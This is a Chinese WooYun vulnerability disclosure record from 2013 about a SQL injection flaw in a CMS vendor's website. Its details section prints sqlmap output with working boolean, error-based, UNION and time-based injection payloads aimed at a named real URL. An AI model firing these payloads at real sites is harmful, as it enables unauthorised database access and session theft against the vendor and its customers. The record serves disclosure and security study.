{"id": 62225, "wybug_id": "wooyun-2013-036474", "wybug_title": "视创网站sql 注入漏洞一枚", "wybug_corp": "视创", "wybug_author": "shafreeck", "wybug_date": "2013-09-09 19:05", "wybug_open_date": "2013-10-24 19:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "后台被猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-09：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-10-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： http://www.vii.com.cn/topic.php?channelID=2&topicID=18 对参数过滤不严，导致sql 注入，可获取数据库内容，同时由于session 保存在mysql 中，可能造成cookie 欺骗。由于视讯作为CMS 提供商，其服务客户应都有这个漏洞。 详细说明：  sqlmap 输出：\nPlace: GETParameter: topicID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: channelID=2&topicID=18 AND 7368=7368    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: channelID=2&topicID=18 AND (SELECT 1676 FROM(SELECT COUNT(*),CONCAT(0x71666b6971,(SELECT (CASE WHEN (1676=1676) THEN 1 ELSE 0 END)),0x71726b6871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)Place: GETParameter: channelID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: channelID=2 AND 9418=9418&topicID=18    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: channelID=2 AND (SELECT 5264 FROM(SELECT COUNT(*),CONCAT(0x71666b6971,(SELECT (CASE WHEN (5264=5264) THEN 1 ELSE 0 END)),0x71726b6871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&topicID=18    Type: UNION query    Title: MySQL UNION query (NULL) - 1 column    Payload: channelID=-8971 UNION ALL SELECT CONCAT(0x71666b6971,0x73546871627650496854,0x71726b6871)#&topicID=18    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: channelID=2 AND SLEEP(5)&topicID=18\n   漏洞证明：  \n\n   修复方案：  检查参数   版权声明：转载请注明来源 shafreeck@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}